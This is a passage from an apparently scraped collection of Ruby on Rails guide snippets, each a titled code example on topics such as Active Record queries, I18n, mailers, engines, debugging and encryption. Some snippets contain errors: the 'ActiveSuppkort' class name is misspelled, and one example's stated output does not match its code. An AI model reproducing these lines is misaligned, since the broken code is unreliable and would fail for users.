irb> person.first_name_was
=> nil

----------------------------------------

TITLE: HTML Output for Select Box with Option Groups
DESCRIPTION: The HTML output generated by the Rails form helper for a select box with option groups. It shows how the optgroup elements are created with appropriate labels and option values.

LANGUAGE: html
CODE:
<select name="city" id="city">
  <optgroup label="Europe">
    <option value="BE">Berlin</option>
    <option value="MD">Madrid</option>
  </optgroup>
  <optgroup label="North America">
    <option value="CHI" selected="selected">Chicago</option>
  </optgroup>
</select>

----------------------------------------

TITLE: Generating Controller Tests Only
DESCRIPTION: Shows the command to generate test scaffold code for an existing controller without generating the controller itself.

LANGUAGE: bash
CODE:
$ bin/rails generate test_unit:scaffold article
...
invoke  test_unit
create    test/controllers/articles_controller_test.rb
...

----------------------------------------

TITLE: Defining Translations for Nested Attributes in Rails I18n
DESCRIPTION: Demonstrates how to define translations for nested attributes within models, using the model/attribute notation in YAML configuration.

LANGUAGE: yaml
CODE:
en:
  activerecord:
    attributes:
      user/role:
        admin: "Admin"
        contributor: "Contributor"

----------------------------------------

TITLE: Using extract! in Ruby on Rails Array extensions
DESCRIPTION: The extract! method removes and returns elements for which the block returns true. If no block is given, an Enumerator is returned. Defined in active_support/core_ext/array/extract.rb.

LANGUAGE: ruby
CODE:
numbers = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
odd_numbers = numbers.extract! { |number| number.odd? } # => [1, 3, 5, 7, 9]
numbers # => [0, 2, 4, 6, 8]

----------------------------------------

TITLE: Enabling Key References Storage in Encrypted Messages
DESCRIPTION: Configures Active Record Encryption to store a reference to the encryption key in the encrypted message headers. This improves decryption performance when multiple keys are in use.

LANGUAGE: ruby
CODE:
config.active_record.encryption.store_key_references = true

----------------------------------------

TITLE: Setting CDN Host through Environment Variable in Rails
DESCRIPTION: Configures the CDN host using an environment variable, which makes running staging copies of your site easier by allowing different CDN configurations through environment settings.

LANGUAGE: ruby
CODE:
config.asset_host = ENV["CDN_HOST"]

----------------------------------------

TITLE: IRB Interaction Documentation Format
DESCRIPTION: Shows how to document interactive Ruby (IRB) commands and their outputs using the irb> prefix and => for results.

LANGUAGE: ruby
CODE:
# Find the customer with primary key (id) 10.
#   irb> customer = Customer.find(10)
#   # => #<Customer id: 10, first_name: "Ryan">

----------------------------------------

TITLE: Including Images from Subdirectories in Rails
DESCRIPTION: Demonstrates how to reference images organized in subdirectories using the image_tag helper. This allows for better organization of assets in larger applications.

LANGUAGE: erb
CODE:
<%= image_tag "icons/rails.png" %>

----------------------------------------

TITLE: Configuring Rails Logger for Autoloaders in an Initializer
DESCRIPTION: Sets the Rails logger as the logger for autoloaders in an initializer, ensuring the Rails logger is available when the configuration is applied.

LANGUAGE: ruby
CODE:
# config/initializers/log_autoloaders.rb
Rails.autoloaders.logger = Rails.logger

----------------------------------------

TITLE: Linking JavaScript Packages for Local Development
DESCRIPTION: Uses yarn link to connect a local Rails JavaScript package (ActiveStorage in this example) to a test application. This allows testing JavaScript changes in the context of a Rails application.

LANGUAGE: bash
CODE:
$ cd rails/activestorage
$ yarn link
$ cd ~/my-test-app
$ yarn link "@rails/activestorage"

----------------------------------------

TITLE: Basic Single Database Configuration
DESCRIPTION: A simple YAML configuration for a single database setup in Rails, serving as the starting point before expanding to multiple databases.

LANGUAGE: yaml
CODE:
production:
  database: my_primary_database
  adapter: mysql2
  username: root
  password: <%= ENV['ROOT_PASSWORD'] %>

----------------------------------------

TITLE: Running a Rails application template with rails new
DESCRIPTION: Command to generate a new Rails application using a template file. This approach applies the template during the initial application creation process.

LANGUAGE: bash
CODE:
$ rails new my_cool_app -m path/to/template.rb

----------------------------------------

TITLE: Creating a New Rails 4.0 Application with Bash
DESCRIPTION: Commands to create a new Rails 4.0 application using the rails gem. This shows the basic process of generating a new application and changing to its directory.

LANGUAGE: bash
CODE:
# You should have the 'rails' RubyGem installed
$ rails new myapp
$ cd myapp

----------------------------------------

TITLE: Using Authentication Test Helper in Controller Tests
DESCRIPTION: Example of using the SignInHelper in a controller test to authenticate before testing a profile page. The helper simplifies test code by abstracting authentication logic.

LANGUAGE: ruby
CODE:
require "test_helper"

class ProfileControllerTest < ActionDispatch::IntegrationTest
  test "should show profile" do
    # helper is now reusable from any controller test case
    sign_in_as users(:david)

    get profile_url
    assert_response :success
  end
end

----------------------------------------

TITLE: Using #where with Composite Primary Keys in Rails
DESCRIPTION: Shows how to use the where method with tuple-like syntax to query records by composite primary keys.

LANGUAGE: ruby
CODE:
Product.where(Product.primary_key => [[1, "ABC98765"], [7, "ZZZ11111"]])

----------------------------------------

TITLE: Implementing Deeply Nested Resources in Rails
DESCRIPTION: Example of deep nesting with publishers, magazines, and photos, creating a three-level hierarchy. This demonstrates the concept but is not recommended due to complexity and maintenance issues.

LANGUAGE: ruby
CODE:
resources :publishers do
  resources :magazines do
    resources :photos
  end
end

----------------------------------------

TITLE: Querying All Records of a Model in Rails
DESCRIPTION: Using the all method to retrieve all records from the products table. This returns an ActiveRecord::Relation containing Product instances for each database row.

LANGUAGE: irb
CODE:
store(dev)> Product.all
  Product Load (0.1ms)  SELECT "products".* FROM "products" /* loading for pp */ LIMIT 11 /*application='Store'*/
=> [#<Product:0x0000000121845158 id: 1, name: "T-Shirt", created_at: "2024-11-09 16:35:01.117836000 +0000", updated_at: "2024-11-09 16:35:01.117836000 +0000">,
 #<Product:0x0000000121845018 id: 2, name: "Pants", created_at: "2024-11-09 16:36:01.856751000 +0000", updated_at: "2024-11-09 16:36:01.856751000 +0000">]

----------------------------------------

TITLE: Expected Output from System Test Generation
DESCRIPTION: Example output after running the system test generator command showing the created test file path.

LANGUAGE: text
CODE:
      invoke  test_unit
      create    test/system/articles_test.rb

----------------------------------------

TITLE: Using with_lock Method for Combined Transaction and Locking
DESCRIPTION: Demonstrates the with_lock method which combines starting a transaction and acquiring a lock in one operation. This allows for a cleaner syntax when working with an existing model instance that needs to be locked for updates.

LANGUAGE: ruby
CODE:
book = Book.first
book.with_lock do
  # This block is called within a transaction,
  # book is already locked.
  book.increment!(:views)
end

----------------------------------------

TITLE: Setting the XML Parser Backend in Active Support
DESCRIPTION: This Ruby code shows how to swap XML parsers in ActiveSupport's XMLmini module. The default is REXML, but you can specify faster alternatives like LibXML or Nokogiri if you have the appropriate gems installed.

LANGUAGE: ruby
CODE:
XmlMini.backend = 'LibXML'

----------------------------------------

TITLE: Configuring I18n Fallbacks with Boolean Flag in Ruby
DESCRIPTION: Sets up internationalization fallbacks by enabling default locale as fallback using a boolean flag. This is a simple approach that uses the default locale as a fallback when translations are missing.

LANGUAGE: ruby
CODE:
config.i18n.fallbacks = true

----------------------------------------

TITLE: Customizing Mailer Templates Path and Name in Rails
DESCRIPTION: Ruby code showing how to customize the template path and name for a mailer action. This allows for reusing templates across different mailer actions or organizing templates in subdirectories.

LANGUAGE: ruby
CODE:
class UserMailer < ApplicationMailer
  default from: "notifications@example.com"

  def welcome_email
    @user = params[:user]
    @url  = "http://example.com/login"
    mail(to: @user.email,
         subject: "Welcome to My Awesome Site",
         template_path: "notifications",
         template_name: "hello")
  end
end

----------------------------------------

TITLE: I18n Module Configuration Attributes in Ruby
DESCRIPTION: Lists the available attribute readers and writers in the I18n module that can be used to configure internationalization settings like load paths, locale, and backends.

LANGUAGE: ruby
CODE:
load_path                 # Announce your custom translation files
locale                    # Get and set the current locale
default_locale            # Get and set the default locale
available_locales         # Permitted locales available for the application
enforce_available_locales # Enforce locale permission (true or false)
exception_handler         # Use a different exception_handler
backend                   # Use a different backend

----------------------------------------

TITLE: Configuring UUID for Action Text Tables
DESCRIPTION: Migration code for configuring Action Text to use UUID identifiers, which is necessary when your models use UUID values as primary keys.

LANGUAGE: ruby
CODE:
t.references :record, null: false, polymorphic: true, index: false, type: :uuid

----------------------------------------

TITLE: Setting Global Context for Error Reporting
DESCRIPTION: Using Rails.error.set_context to establish global context that will be included with all subsequent error reports. This context is merged with any context provided in individual error handling calls.

LANGUAGE: ruby
CODE:
Rails.error.set_context(section: "checkout", user_id: @user.id)

----------------------------------------

TITLE: Clearing Sessions in Rails 3.1 Upgrade
DESCRIPTION: Alternative to changing the session key - this rake command clears all existing sessions from the database during the upgrade process.

LANGUAGE: bash
CODE:
$ bin/rake db:sessions:clear

----------------------------------------

TITLE: Configuring Test Environment in Rails 3.2
DESCRIPTION: Configuration for the test environment in Rails 3.2, setting strict mass assignment protection for Active Record models.

LANGUAGE: ruby
CODE:
# Raise exception on mass assignment protection for Active Record models
config.active_record.mass_assignment_sanitizer = :strict

----------------------------------------

TITLE: Link Formatting Best Practices in Rails Guides
DESCRIPTION: Demonstrates the correct and incorrect ways to format links in Rails Guides documentation, emphasizing the use of descriptive link text rather than generic terms like "here" or "more".

LANGUAGE: markdown
CODE:
# BAD
See the Rails Internationalization (I18n) API documentation for [more
details](i18n.html).

# GOOD
See the [Rails Internationalization (I18n) API documentation](i18n.html) for
more details.

----------------------------------------

TITLE: Customizing Host Authorization Response in Rails
DESCRIPTION: Demonstrates how to customize the response when a request comes to an unauthorized host. By default, Rails responds with 403 Forbidden, but this can be changed to a custom response.

LANGUAGE: ruby
CODE:
Rails.application.config.host_authorization = {
  response_app: -> env do
    [400, { "Content-Type" => "text/plain" }, ["Bad Request"]]
  end
}

----------------------------------------

TITLE: Implementing Complete Acts As Yaffle Module
DESCRIPTION: Full implementation of the ActsAsYaffle module with both class and instance methods. This demonstrates how to add configurable behavior to Active Record models through a plugin.

LANGUAGE: ruby
CODE:
# yaffle/lib/yaffle/acts_as_yaffle.rb

module Yaffle
  module ActsAsYaffle
    extend ActiveSupport::Concern

    included do
      def squawk(string)
        write_attribute(self.class.yaffle_text_field, string.to_squawk)
      end
    end

    class_methods do
      def acts_as_yaffle(options = {})
        cattr_accessor :yaffle_text_field, default: (options[:yaffle_text_field] || :last_squawk).to_s
      end
    end
  end
end

----------------------------------------

TITLE: Documenting Dynamically Generated Methods with Class Eval
DESCRIPTION: Demonstrates the proper way to document methods that are created dynamically using class_eval. When the resulting code would be too wide, the comment should be placed above the call.

LANGUAGE: ruby
CODE:
# def self.find_by_login_and_activated(*args)
#   options = args.extract_options!
#   ...
# end
self.class_eval %{
  def self.#{method_id}(*args)
    options = args.extract_options!
    ...
  end
}, __FILE__, __LINE__

----------------------------------------

TITLE: Sample CSS Asset for Rails
DESCRIPTION: Example CSS file that would be placed in the app/assets/stylesheets directory and served by Propshaft in a Rails application.

LANGUAGE: css
CODE:
/* app/assets/stylesheets/main.css */
body {
  background-color: red;
}

----------------------------------------

TITLE: Configuring Allowed Request Origins for Action Cable
DESCRIPTION: Ruby configuration code to specify allowed request origins for Action Cable connections. This helps prevent unauthorized WebSocket connections by restricting them to specific domains or patterns.

LANGUAGE: ruby
CODE:
config.action_cable.allowed_request_origins = ["https://rubyonrails.com", %r{http://ruby.*}]

----------------------------------------

TITLE: Products After Update Output in Rails
DESCRIPTION: Output showing the list of products after an update operation, confirming that the name change from "T-Shirt" to "Shoes" was successful.

LANGUAGE: irb
CODE:
  Product Load (0.3ms)  SELECT "products".* FROM "products" /* loading for pp */ LIMIT 11 /*application='Store'*/
=>
[#<Product:0x000000012c0f7300
  id: 1,
  name: "Shoes",
  created_at: "2024-12-02 20:29:56.303546000 +0000",
  updated_at: "2024-12-02 20:30:14.127456000 +0000">,
 #<Product:0x000000012c0f71c0
  id: 2,
  name: "Pants",
  created_at: "2024-12-02 20:30:02.997261000 +0000",
  updated_at: "2024-12-02 20:30:02.997261000 +0000">]

----------------------------------------

TITLE: Using Advanced Breakpoint Options in Rails Debugger
DESCRIPTION: This snippet explains the advanced breakpoint options available in the Rails debugger including conditional breakpoints, command execution, and path-based filters. It shows how to use 'do:', 'pre:', 'if:', and 'path:' options to create more sophisticated debugging workflows.

LANGUAGE: ruby
CODE:
[2, 11] in ~/projects/rails-guide-example/app/controllers/posts_controller.rb
     2|   before_action :set_post, only: %i[ show edit update destroy ]
     3|
     4|   # GET /posts or /posts.json
     5|   def index
     6|     @posts = Post.all
=>   7|     debugger(do: "info")
     8|   end
     9|
    10|   # GET /posts/1 or /posts/1.json
    11|   def show
=>#0    PostsController#index at ~/projects/rails-guide-example/app/controllers/posts_controller.rb:7
  #1    ActionController::BasicImplicitRender#send_action(method="index", args=[]) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-7.0.0.alpha2/lib/action_controller/metal/basic_implicit_render.rb:6
  # and 72 frames (use `bt' command for all frames)
(rdbg:binding.break) info
%self = #<PostsController:0x00000000017480>
@_action_has_layout = true
@_action_name = "index"
@_config = {}
@_lookup_context = #<ActionView::LookupContext:0x00007fce3ad336b8 @details_key=nil, @digest_cache=...
@_request = #<ActionDispatch::Request GET "http://localhost:3000/posts" for 127.0.0.1>
@_response = #<ActionDispatch::Response:0x00007fce3ad397e8 @mon_data=#<Monitor:0x00007fce3ad396a8>...
@_response_body = nil
@_routes = nil
@marked_for_same_origin_verification = true
@posts = #<ActiveRecord::Relation [#<Post id: 2, title: "qweqwe", content: "qweqwe", created_at: "...
@rendered_format = nil

----------------------------------------

TITLE: Extracting Composite Key Parameters in Rails Controller
DESCRIPTION: This snippet shows how to handle composite key parameters in a controller action by extracting values using the extract_value method before passing them to Active Record.

LANGUAGE: ruby
CODE:
class BooksController < ApplicationController
  def show
    # Extract the composite ID value from URL parameters.
    id = params.extract_value(:id)
    @book = Book.find(id)
  end
end

----------------------------------------

TITLE: Setting File Sync for ActiveSupport::BufferedLogger
DESCRIPTION: Example of how to properly set up synchronization for file logging as an alternative to the deprecated auto_flushing functionality in ActiveSupport::BufferedLogger. This approach directly sets the sync property on the file handle.

LANGUAGE: ruby
CODE:
f = File.open('foo.log', 'w')
f.sync = true
ActiveSuppkort::BufferedLogger.new f

----------------------------------------

TITLE: Setting Debug Exception Response Format for HTML
DESCRIPTION: Configuration for API applications to render debugging information as HTML in development mode. This overrides the default API behavior.

LANGUAGE: ruby
CODE:
config.debug_exception_response_format = :default

----------------------------------------

TITLE: Basic Partial Rendering
DESCRIPTION: Simple example of rendering a partial template in Rails using the render method.

LANGUAGE: html+erb
CODE:
<%= render "product" %>

----------------------------------------

TITLE: Running Rails templates from remote URLs
DESCRIPTION: Commands demonstrating how to apply Rails templates hosted at remote URLs rather than local files. This enables sharing templates across projects or teams.

LANGUAGE: bash
CODE:
$ rails new my_cool_app -m http://example.com/template.rb
$ bin/rails app:template LOCATION=http://example.com/template.rb

----------------------------------------

TITLE: Controller Code for User Retrieval
DESCRIPTION: Example controller code that finds a user based on the ID parameter passed from the route.

LANGUAGE: ruby
CODE:
@user = User.find(params[:id])

----------------------------------------

TITLE: Using assert_routing for Testing Bidirectional Routes in Rails
DESCRIPTION: Tests that path and options match both ways, verifying that path generates options and that options generate path.

LANGUAGE: ruby
CODE:
assert_routing(expected_path, options, defaults = {}, extras = {}, message = nil)

----------------------------------------

TITLE: Using only Method to Retain Specific Conditions in ActiveRecord
DESCRIPTION: Demonstrates how to use the 'only' method to keep only specific parts of a query while removing others, such as retaining order and where clauses but removing limit.

LANGUAGE: ruby
CODE:
Book.where("id > 10").limit(20).order("id desc").only(:order, :where)

LANGUAGE: sql
CODE:
SELECT * FROM books WHERE id > 10 ORDER BY id DESC

-- Original query without `only`
SELECT * FROM books WHERE id > 10 ORDER BY id DESC LIMIT 20

----------------------------------------

TITLE: String Start and End Checks in Ruby
DESCRIPTION: Shows ActiveSupport's aliases for start_with? and end_with? methods that use third-person form.

LANGUAGE: ruby
CODE:
"foo".starts_with?("f") # => true
"foo".ends_with?("o")   # => true

----------------------------------------

TITLE: Adding Time Calculation Methods in Ruby
DESCRIPTION: Added new time calculation methods 'weeks_ago' and 'prev_week' to Date, DateTime, and Time classes, enhancing time manipulation capabilities.

LANGUAGE: ruby
CODE:
weeks_ago

LANGUAGE: ruby
CODE:
prev_week

----------------------------------------

TITLE: Using inline syntax for format variants in Rails controllers
DESCRIPTION: Example of using the simplified inline syntax for defining format and variant responses in a Rails controller action.

LANGUAGE: ruby
CODE:
respond_to do |format|
  format.js         { render "trash" }
  format.html.phone { redirect_to progress_path }
  format.html.none  { render "trash" }
end

----------------------------------------

TITLE: Creating a Delete Link with Turbo Method Override
DESCRIPTION: ERB code showing how to create a link that uses a non-GET HTTP method with Turbo. This example creates a delete link using data-turbo-method.

LANGUAGE: erb
CODE:
<%= link_to "Delete post", post_path(post), data: { turbo_method: "delete" } %>

LANGUAGE: html
CODE:
<a data-turbo-method="delete" href="...">Delete post</a>

----------------------------------------

TITLE: Validating Parameters with expect in Ruby on Rails
DESCRIPTION: Using the params.expect method to validate and permit specific parameters in a nested structure including arrays. This example demonstrates parameter validation for a book with chapters.

LANGUAGE: ruby
CODE:
params.expect(book: [ :title, chapters_attributes: [[ :title ]] ])

----------------------------------------

TITLE: Configuring Asset Precompilation for Engine Assets
DESCRIPTION: Demonstrates how to explicitly define engine assets for precompilation when they aren't required by the host application, ensuring they are included during assets:precompile task.

LANGUAGE: ruby
CODE:
initializer "blorgh.assets.precompile" do |app|
  app.config.assets.precompile += %w( admin.js admin.css )
end

----------------------------------------

TITLE: Inheriting from Application Controller
DESCRIPTION: Modifies the engine's ApplicationController to inherit from the main application's ApplicationController, allowing engine controllers to access shared functionality.

LANGUAGE: ruby
CODE:
module Blorgh
  class ApplicationController < ::ApplicationController
  end
end

----------------------------------------

TITLE: Generating a System Test in Rails
DESCRIPTION: This command generates a skeleton for a system test named users using the Rails generator. System tests allow testing the application from a user's perspective with a real or headless browser.

LANGUAGE: bash
CODE:
$ bin/rails generate system_test users
      invoke test_unit
      create test/system/users_test.rb

----------------------------------------

TITLE: Configuring PostgreSQL Database for JRuby in Rails
DESCRIPTION: This configuration shows the setup for a PostgreSQL database when using JRuby. It uses the jdbcpostgresql adapter instead of the standard postgresql adapter.

LANGUAGE: yaml
CODE:
development:
  adapter: jdbcpostgresql
  encoding: unicode
  database: blog_development
  username: blog
  password:

----------------------------------------

TITLE: SQL Output for Encrypted Data Storage
DESCRIPTION: Example of how encrypted data appears in the SQL query when stored in the database. The data is encrypted as a JSON structure containing the encrypted payload and metadata.

LANGUAGE: sql
CODE:
INSERT INTO `articles` (`title`) VALUES ('{\"p\":\"n7J0/ol+a7DRMeaE\",\"h\":{\"iv\":\"DXZMDWUKfp3bg/Yu\",\"at\":\"X1/YjMHbHD4talgF9dt61A==\"}}')

----------------------------------------

TITLE: Generating Select Options from City Collection in Ruby
DESCRIPTION: This snippet shows how to manually generate options for a select box from a collection of City objects. It maps each city to an array containing the city name and ID.

LANGUAGE: ruby
CODE:
City.order(:name).map { |city| [city.name, city.id] }
# => [["Berlin", 1], ["Chicago", 3], ["Madrid", 2]]

----------------------------------------

TITLE: Referencing Background Images in CSS
DESCRIPTION: Shows how to reference a background image in CSS. Propshaft automatically converts the URL to include the asset digest in production, ensuring proper caching and versioning.

LANGUAGE: css
CODE:
background: url("/bg/pattern.svg");

----------------------------------------

TITLE: JavaScript Bundling Example
DESCRIPTION: Shows the concept of bundling where multiple JavaScript files are combined into a single file. This was important for HTTP/1.1 but is less critical with HTTP/2, which is why Propshaft doesn't include bundling by default.

LANGUAGE: javascript
CODE:
// app/javascript/application.js
// Contents of menu.js, cart.js, and checkout.js are combined here

----------------------------------------

TITLE: Namespaced Routes for Mountable Engine
DESCRIPTION: Routes file with namespace isolation created when using the --mountable option for a Rails engine.

LANGUAGE: ruby
CODE:
Blorgh::Engine.routes.draw do
end

----------------------------------------

TITLE: Setting Method Breakpoints in Rails with break Command
DESCRIPTION: This snippet shows how to set a breakpoint on a specific method call using the 'b' command in the Rails debugger, allowing execution to stop when that method is invoked.

LANGUAGE: ruby
CODE:
[20, 29] in ~/projects/rails-guide-example/app/controllers/posts_controller.rb
    20|   end
    21|
    22|   # POST /posts or /posts.json
    23|   def create
    24|     @post = Post.new(post_params)
=>  25|     debugger
    26|
    27|     respond_to do |format|
    28|       if @post.save
    29|         format.html { redirect_to @post, notice: "Post was successfully created." }
=>#0    PostsController#create at ~/projects/rails-guide-example/app/controllers/posts_controller.rb:25
  #1    ActionController::BasicImplicitRender#send_action(method="create", args=[]) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-7.0.0.alpha2/lib/action_controller/metal/basic_implicit_render.rb:6
  # and 72 frames (use `bt' command for all frames)
(rdbg) b @post.save    # break command
#0  BP - Method  @post.save at /Users/st0012/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activerecord-7.0.0.alpha2/lib/active_record/suppressor.rb:43

LANGUAGE: ruby
CODE:
(rdbg) c    # continue command
[39, 48] in ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activerecord-7.0.0.alpha2/lib/active_record/suppressor.rb
    39|         SuppressorRegistry.suppressed[name] = previous_state
    40|       end
    41|     end
    42|
    43|     def save(**) # :nodoc:
=>  44|       SuppressorRegistry.suppressed[self.class.name] ? true : super
    45|     end
    46|
    47|     def save!(**) # :nodoc:
    48|       SuppressorRegistry.suppressed[self.class.name] ? true : super
=>#0    ActiveRecord::Suppressor#save(#arg_rest=nil) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activerecord-7.0.0.alpha2/lib/active_record/suppressor.rb:44
  #1    block {|format=#<ActionController::MimeResponds::Collec...|} in create at ~/projects/rails-guide-example/app/controllers/posts_controller.rb:28
  # and 75 frames (use `bt' command for all frames)

Stop by #0  BP - Method  @post.save at /Users/st0012/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activerecord-7.0.0.alpha2/lib/active_record/suppressor.rb:43

----------------------------------------

TITLE: Proper Order for Serialized and Encrypted Attributes
DESCRIPTION: Example showing the correct order when using both serialized attributes and encryption. The serialization must be declared before encryption.

LANGUAGE: ruby
CODE:
# CORRECT
class Article < ApplicationRecord
  serialize :title, type: Title
  encrypts :title
end

# INCORRECT
class Article < ApplicationRecord
  encrypts :title
  serialize :title, type: Title
end

----------------------------------------

TITLE: Using pluck in Ruby on Rails
DESCRIPTION: The pluck method extracts the given key from each element in an enumerable. It can extract a single key or multiple keys. Defined in active_support/core_ext/enumerable.rb.

LANGUAGE: ruby
CODE:
[{ name: "David" }, { name: "Rafael" }, { name: "Aaron" }].pluck(:name) # => ["David", "Rafael", "Aaron"]
[{ id: 1, name: "David" }, { id: 2, name: "Rafael" }].pluck(:id, :name) # => [[1, "David"], [2, "Rafael"]]

----------------------------------------

TITLE: Testing Action Mailbox with TestHelpers in Rails
DESCRIPTION: Example of a test case for Action Mailbox using TestHelpers. Demonstrates how to test email processing by simulating an incoming email and checking that the application correctly processes it.

LANGUAGE: ruby
CODE:
class ForwardsMailboxTest < ActionMailbox::TestCase
  test "directly recording a client forward for a forwarder and forwardee corresponding to one project" do
    assert_difference -> { people(:david).buckets.first.recordings.count } do
      receive_inbound_email_from_mail \
        to: "save@example.com",
        from: people(:david).email_address,
        subject: "Fwd: Status update?",
        body: <<~BODY
          --- Begin forwarded message ---
          From: Frank Holland <frank@microsoft.com>

          What's the status?
        BODY
    end

    recording = people(:david).buckets.first.recordings.last
    assert_equal people(:david), recording.creator
    assert_equal "Status update?", recording.forward.subject
    assert_match "What's the status?", recording.forward.content.to_s
  end
end

----------------------------------------

TITLE: Proper Currency Translation with Interpolation in Rails ERB
DESCRIPTION: An example of correct internationalization in an ERB template using variable interpolation. This approach allows each locale to define the appropriate positioning of currency symbols and values.

LANGUAGE: erb
CODE:
<!-- app/views/products/show.html.erb -->
<%= t('product_price', price: @product.price) %>

----------------------------------------

TITLE: Basic Jbuilder JSON Template Example
DESCRIPTION: A simple Jbuilder template showing how to generate JSON responses with name and email fields.

LANGUAGE: ruby
CODE:
json.name("Alex")
json.email("alex@example.com")

----------------------------------------

TITLE: Rendering Custom Objects with render_in Method
DESCRIPTION: Defining and rendering a custom object that responds to render_in and format methods, demonstrating Rails' ability to render objects directly.

LANGUAGE: ruby
CODE:
class Greeting
  def render_in(view_context)
    view_context.render html: "Hello, World"
  end

  def format
    :html
  end
end

render Greeting.new
# => "Hello World"

----------------------------------------

TITLE: Creating Action Mailer previews in Rails 4.1
DESCRIPTION: Example of implementing an Action Mailer preview class that allows viewing email templates in the browser without sending actual emails. Previews are accessible via specific URLs.

LANGUAGE: ruby
CODE:
class NotifierPreview < ActionMailer::Preview
  def welcome
    Notifier.welcome(User.first)
  end
end

----------------------------------------

TITLE: Using assert_no_changes for Testing Value Stability in Ruby
DESCRIPTION: Tests that the result of evaluating an expression remains the same after invoking the block.

LANGUAGE: ruby
CODE:
assert_no_changes(expressions, message = nil, &block)

----------------------------------------

TITLE: Using Array Values for IN Conditions in Rails
DESCRIPTION: Demonstrates how to use an array of values to create SQL IN conditions, allowing you to match records against multiple possible values.

LANGUAGE: ruby
CODE:
Customer.where(orders_count: [1, 3, 5])

----------------------------------------

TITLE: Setting Background Color for resize_and_pad with Vips in Active Storage
DESCRIPTION: Shows how to specify a background color when using resize_and_pad with libvips, as it defaults to black instead of white like ImageMagick.

LANGUAGE: ruby
CODE:
- variant(resize_and_pad: [300, 300])
+ variant(resize_and_pad: [300, 300, background: [255]])

----------------------------------------

TITLE: Declaring Enum Attributes in ActiveRecord
DESCRIPTION: A new method for declaring enum attributes where values map to integers in the database but can be queried by name in application code.

LANGUAGE: ruby
CODE:
ActiveRecord::Base#enum

----------------------------------------

TITLE: Halting Execution with Exceptions in ActiveRecord Callbacks
DESCRIPTION: Demonstrates how raising an exception within a callback halts the execution chain and triggers a rollback. This approach is less preferred as it causes unexpected exceptions from methods like create and save.

LANGUAGE: ruby
CODE:
class Product < ActiveRecord::Base
  before_validation do
    raise "Price can't be negative" if total_price < 0
  end
end

Product.create # raises "Price can't be negative"

----------------------------------------

TITLE: Implementing a Mailbox Class for Email Processing in Rails
DESCRIPTION: Example of a ForwardsMailbox class that processes incoming emails to create 'forwards' for a user's project. Uses callbacks to validate prerequisites and includes logic for handling various scenarios based on the user's projects.

LANGUAGE: ruby
CODE:
# app/mailboxes/forwards_mailbox.rb
class ForwardsMailbox < ApplicationMailbox
  # Callbacks specify prerequisites to processing
  before_processing :require_projects

  def process
    # Record the forward on the one project, orâ¦
    if forwarder.projects.one?
      record_forward
    else
      # â¦involve a second Action Mailer to ask which project to forward into.
      request_forwarding_project
    end
  end

  private
    def require_projects
      if forwarder.projects.none?
        # Use Action Mailers to bounce incoming emails back to sender â this halts processing
        bounce_with Forwards::BounceMailer.no_projects(inbound_email, forwarder: forwarder)
      end
    end

    def record_forward
      forwarder.forwards.create subject: mail.subject, content: mail.decoded
    end

    def request_forwarding_project
      Forwards::RoutingMailer.choose_project(inbound_email, forwarder: forwarder).deliver_now
    end

    def forwarder
      @forwarder ||= User.find_by(email_address: mail.from)
    end
end

----------------------------------------

TITLE: Using Nonce with JavaScript and Stylesheet Inclusion Helpers
DESCRIPTION: This example demonstrates how to add CSP nonces to externally included JavaScript and CSS files using Rails helper methods, allowing these resources to be loaded even with a strict Content Security Policy.

LANGUAGE: ruby
CODE:
<%= javascript_include_tag "script", nonce: true %>
<%= stylesheet_link_tag "style.css", nonce: true %>

----------------------------------------

TITLE: Running Active Record Tests for PostgreSQL
DESCRIPTION: Shows how to run the Active Record test suite specifically for the PostgreSQL adapter. This requires that the PostgreSQL database has been previously set up.

LANGUAGE: bash
CODE:
$ bundle exec rake test:postgresql

----------------------------------------

TITLE: Defining Test Helpers in Separate Files
DESCRIPTION: Example of defining a test helper in a separate file in test/test_helpers directory. This demonstrates how to organize helpers for better maintainability.

LANGUAGE: ruby
CODE:
# test/test_helpers/multiple_assertions.rb
module MultipleAssertions
  def assert_multiple_of_forty_two(number)
    assert (number % 42 == 0), "expected #{number} to be a multiple of 42"
  end
end

----------------------------------------

TITLE: Configuring Rails Application to Load Engine Overrides
DESCRIPTION: Shows how to organize engine overrides in a dedicated directory and configure the Rails application to preload them using a to_prepare callback. This allows for extending or decorating engine components.

LANGUAGE: ruby
CODE:
# config/application.rb
module MyApp
  class Application < Rails::Application
    # ...

    overrides = "#{Rails.root}/app/overrides"
    Rails.autoloaders.main.ignore(overrides)

    config.to_prepare do
      Dir.glob("#{overrides}/**/*_override.rb").sort.each do |override|
        load override
      end
    end
  end
end

----------------------------------------

TITLE: Registering Mail Observers in Ruby
DESCRIPTION: Demonstrates how to register observer classes that will be notified when mail is delivered through Action Mailer.

LANGUAGE: ruby
CODE:
config.action_mailer.observers = ["MailObserver"]

----------------------------------------

TITLE: Running Database Setup Commands for Plugin Testing
DESCRIPTION: Commands to create the test database for the dummy Rails application that is used for integration testing of the plugin. This initializes the database for the test environment.

LANGUAGE: bash
CODE:
$ cd test/dummy
$ bin/rails db:create

----------------------------------------

TITLE: Correctly Setting up Engine Routes in Controller Tests
DESCRIPTION: Shows the correct approach to test engine controllers by explicitly setting the @routes instance variable to the engine's route set, ensuring proper routing for the test requests.

LANGUAGE: ruby
CODE:
module Blorgh
  class FooControllerTest < ActionDispatch::IntegrationTest
    include Engine.routes.url_helpers

    setup do
      @routes = Engine.routes
    end

    def test_index
      get foos_url
      # ...
    end
  end
end

----------------------------------------

TITLE: Starting a Rails Server
DESCRIPTION: Command to start a Rails server in development mode, which will serve assets through Propshaft without digestion or caching for easier development.

LANGUAGE: bash
CODE:
$ bin/rails server

----------------------------------------

TITLE: Inspecting Autoload Paths in Rails Console
DESCRIPTION: Commands to print the autoload paths and autoload once paths in a Rails application using the Rails runner. Useful for debugging autoloading configuration.

LANGUAGE: bash
CODE:
# Print autoload paths.
$ bin/rails runner 'pp Rails.autoloaders.main.dirs'

# Print autoload once paths.
$ bin/rails runner 'pp Rails.autoloaders.once.dirs'

----------------------------------------

TITLE: Configuring Queue Name Delimiter for ActiveJob in Rails
